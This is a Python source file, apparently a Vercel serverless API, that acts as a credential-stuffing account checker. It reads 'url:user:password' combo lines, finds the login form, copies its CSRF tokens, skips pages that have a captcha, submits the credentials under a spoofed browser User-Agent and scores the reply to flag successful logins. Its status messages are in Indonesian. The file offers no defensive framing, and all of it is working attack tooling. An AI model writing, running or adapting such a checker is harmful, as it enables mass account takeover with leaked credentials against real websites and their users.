import json, re, requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse, urljoin

def normalize_url(url):
    url = url.replace(' | ', '').strip()
    if not urlparse(url).scheme:
        url = 'https://' + url
    return url

def is_valid_url(url):
    try:
        r = urlparse(url)
        return all([r.scheme, r.netloc]) and r.scheme in ['http', 'https']
    except:
        return False

def is_login_page(url):
    try:
        url = normalize_url(url)
        if not is_valid_url(url): return False
        h = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
        r = requests.get(url, headers=h, timeout=10)
        s = BeautifulSoup(r.text, 'html.parser')
        ind = [
            s.find('input', {'type': 'password'}),
            s.find('input', {'name': re.compile('password|pass|pwd', re.I)}),
            s.find('input', {'name': re.compile('username|user|login|email', re.I)}),
            s.find('form', {'method': re.compile('post', re.I)})
        ]
        return sum(1 for x in ind if x) >= 2
    except:
        return False

def detect_form(url):
    try:
        url = normalize_url(url)
        h = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
        sess = requests.Session()
        r = sess.get(url, headers=h, timeout=10)
        s = BeautifulSoup(r.text, 'html.parser')
        forms = s.find_all('form')
        if not forms: return None, None, None, None, None
        f = forms[0]
        act = f.get('action', url)
        if not act.startswith('http'): act = urljoin(url, act)
        method = f.get('method', 'post').lower()
        fields = {}
        for inp in f.find_all('input'):
            name = inp.get('name')
            if name:
                fields[name] = {
                    'type': inp.get('type', 'text'),
                    'required': inp.get('required') is not None,
                    'value': inp.get('value', '')
                }
        tokens = {}
        for hid in f.find_all('input', {'type': 'hidden'}):
            name = hid.get('name'); val = hid.get('value')
            if name and val and re.search(r'csrf|token|auth|nonce', name, re.I):
                tokens[name] = val
        return act, method, fields, tokens, sess
    except:
        return None, None, None, None, None

def has_captcha(url):
    try:
        url = normalize_url(url)
        h = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
        r = requests.get(url, headers=h, timeout=10)
        s = BeautifulSoup(r.text, 'html.parser')
        return any([
            'captcha' in r.text.lower(),
            s.find('div', {'class': re.compile('captcha', re.I)}),
            s.find('img', {'src': re.compile('captcha', re.I)}),
            'g-recaptcha' in r.text,
            'hcaptcha' in r.text
        ])
    except:
        return False

def try_login(action, method, fields, tokens, session, user, pwd):
    try:
        action = normalize_url(action)
        if not is_valid_url(action): return False, None, []
        h = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
        payload = {}
        for name, info in fields.items():
            if info['value']: payload[name] = info['value']
            elif info['type'] == 'password': payload[name] = pwd
            else: payload[name] = user
        payload.update(tokens)
        init = action
        if method == 'post':
            r = session.post(action, data=payload, headers=h, timeout=10, allow_redirects=True)
        else:
            r = session.get(action, params=payload, headers=h, timeout=10, allow_redirects=True)
        final = r.url
        s = BeautifulSoup(r.text, 'html.parser')
        succ = [
            (r.status_code == 200, "Status 200"),
            (final != init, "Redirected"),
            (s.find('a', {'href': re.compile('logout|signout', re.I)}) is not None, "Logout link"),
            (s.find('div', {'class': re.compile('Dashboard|profile|welcome', re.I)}) is not None, "Dashboard"),
            (any(k in r.text.lower() for k in ['welcome','dashboard','profile','logged in']), "Keywords"),
            (s.find('input', {'type': 'password'}) is None, "No password field"),
            (not any(e in r.text.lower() for e in ['invalid','incorrect','failed']), "No errors")
        ]
        fail = [
            (r.status_code in (401,403,400), "Auth error"),
            (s.find('input', {'type': 'password'}) is not None, "Password still there"),
            (any(e in r.text.lower() for e in ['invalid credentials','login failed','wrong']), "Error msg")
        ]
        ss = sum(1 for c,_ in succ if c)
        fs = sum(1 for c,_ in fail if c)
        sr = [r for c,r in succ if c]
        if ss >= 5 and fs == 0 and "Logout link" in sr:
            return True, final, sr
        elif fs > 0:
            return False, final, [r for c,r in fail if c]
        return False, final, []
    except Exception as e:
        return False, None, [str(e)]

def process(line):
    line = line.strip()
    if not line: return {"status":"error","msg":"Kosong","det":"","raw":line}
    parts = line.split(':', 2)
    if len(parts) != 3: return {"status":"error","msg":"Format salah","det":line,"raw":line}
    url_raw, user, pwd = parts
    url = normalize_url(url_raw)
    if not is_valid_url(url): return {"status":"error","msg":"URL invalid","det":url,"raw":line}
    if not is_login_page(url): return {"status":"error","msg":"Bukan halaman login","det":url,"raw":line}
    act, method, fields, tokens, sess = detect_form(url)
    if not act or not fields: return {"status":"error","msg":"Form tidak ditemukan","det":url,"raw":line}
    if has_captcha(url): return {"status":"captcha","msg":"Ada captcha","det":"Skip manual","raw":line}
    ok, final, reasons = try_login(act, method, fields, tokens, sess, user, pwd)
    if ok:
        return {"status":"success","msg":"Login OK → "+final,"det":"; ".join(reasons),"raw":line}
    return {"status":"fail","msg":"Login gagal → "+(final or url),"det":"; ".join(reasons) if reasons else "Salah kredensial","raw":line}

# Vercel entry point
class handler:
    def __init__(self, base): self.base = base
    def __call__(self, environ, start_response):
        method = environ.get('REQUEST_METHOD', 'GET')
        if method == 'OPTIONS':
            start_response('200 OK', [('Content-Type','text/plain'),('Access-Control-Allow-Origin','*'),('Access-Control-Allow-Methods','POST,OPTIONS'),('Access-Control-Allow-Headers','Content-Type')])
            return [b'']
        if method == 'GET':
            start_response('200 OK', [('Content-Type','application/json'),('Access-Control-Allow-Origin','*')])
            return [json.dumps({"ok":True,"msg":"API ready"}).encode()]
        if method == 'POST':
            try:
                cl = int(environ.get('CONTENT_LENGTH', 0))
                body = environ['wsgi.input'].read(cl).decode('utf-8')
                data = json.loads(body)
                result = process(data.get('line',''))
                start_response('200 OK', [('Content-Type','application/json'),('Access-Control-Allow-Origin','*')])
                return [json.dumps(result).encode()]
            except Exception as e:
                start_response('500 OK', [('Content-Type','application/json'),('Access-Control-Allow-Origin','*')])
                return [json.dumps({"status":"error","msg":str(e),"det":"","raw":""}).encode()]
        start_response('405 OK', [('Content-Type','application/json')])
        return [json.dumps({"error":"Method not allowed"}).encode()]
